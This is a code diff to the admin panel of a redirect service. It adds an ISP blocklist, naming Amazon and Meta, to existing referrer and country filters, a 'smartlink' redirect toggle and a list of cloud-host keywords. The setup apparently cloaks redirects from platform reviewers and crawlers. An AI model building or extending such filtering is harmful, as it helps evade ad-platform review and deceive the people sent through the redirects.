@@ -67,6 +67,11 @@
                         <input type="text" id="config-target-countries" class="config-input" placeholder="BR, US, MX">
                         <div class="config-hint">Leave EMPTY to allow all countries. Use ISO codes separated by commas.</div>
                     </div>
+                    <div>
+                        <label class="config-label">🛑 Blocked ISPs / Carriers</label>
+                        <input type="text" id="config-blocked-isps" class="config-input" placeholder="Amazon.com, Inc., Meta Platforms Ireland Limited">
+                        <div class="config-hint">Block datacenter/bot ISPs. Exact or partial match, comma separated.</div>
+                    </div>
                     <div><label class="config-label">🛑 Blocked Broad Domains</label><input type="text" id="config-blocked" class="config-input"><div class="config-hint">e.g., facebook.com blocks all subdomains</div></div>
                     <div><label class="config-label">🎯 Blocked Exact Domains</label><input type="text" id="config-blocked-exact" class="config-input"><div class="config-hint">e.g., m.facebook.com blocks this strictly</div></div>
                 </div>
@@ -119,8 +124,8 @@
 
     <script src="assets/js/main.js"></script>
     <script>
-        // ⚠️ ضع رابط الـ Google Apps Script الجديد (V9) هنا
-        const API_URL = 'https://script.google.com/macros/s/AKfycbxZAC2jGthyYIt-yhm71Hg-5towgBArKY3iXivMtoLBRo17gOpz1x88rp1jmoocvBfSjA/exec';
+        // ⚠️ ضع رابط الـ Google Apps Script الجديد (V10) هنا
+        const API_URL = 'https://script.google.com/macros/s/AKfycbxI33sJG_R6_J0KGJHPZ5YBus4ctbO1Mgm9TsvSSxgdRQjfEWVhfonls8624tf_IkWO/exec';
         const botKeywords = ['amazon', 'google cloud', 'digitalocean', 'ovh', 'hetzner', 'microsoft', 'azure', 'oracle', 'vultr', 'linode', 'hosting'];
         let allData = [];
 
@@ -134,6 +139,7 @@
                 document.getElementById('config-blocked').value = c.blockedReferrers || ''; 
                 document.getElementById('config-blocked-exact').value = c.blockedExactReferrers || ''; 
                 document.getElementById('config-target-countries').value = c.targetCountries || ''; 
+                document.getElementById('config-blocked-isps').value = c.blockedIsps || ''; 
                 const t = document.getElementById('redirect-toggle'); const b = document.getElementById('redirect-status-badge'); 
                 if(c.status==='ON'){t.checked=true;b.textContent='ON';b.className='status-badge status-on';}else{t.checked=false;b.textContent='OFF';b.className='status-badge status-off';} 
                 t.onchange=function(){if(this.checked){b.textContent='ON';b.className='status-badge status-on';}else{b.textContent='OFF';b.className='status-badge status-off';}}; 
@@ -146,8 +152,9 @@
             const bl = encodeURIComponent(document.getElementById('config-blocked').value); 
             const be = encodeURIComponent(document.getElementById('config-blocked-exact').value); 
             const tc = encodeURIComponent(document.getElementById('config-target-countries').value); 
+            const bi = encodeURIComponent(document.getElementById('config-blocked-isps').value); 
             try { 
-                const r = await fetch(`${API_URL}?action=updateConfig&status=${s}&smartlinkUrl=${sl}&blockedReferrers=${bl}&blockedExactReferrers=${be}&targetCountries=${tc}`); 
+                const r = await fetch(`${API_URL}?action=updateConfig&status=${s}&smartlinkUrl=${sl}&blockedReferrers=${bl}&blockedExactReferrers=${be}&targetCountries=${tc}&blockedIsps=${bi}`); 
                 const d = await r.json(); 
                 if(d.status==='success') alert('✅ Settings saved successfully!'); else alert('❌ Failed to save settings.'); 
             } catch(e){ alert('❌ Failed to save settings.'); } 
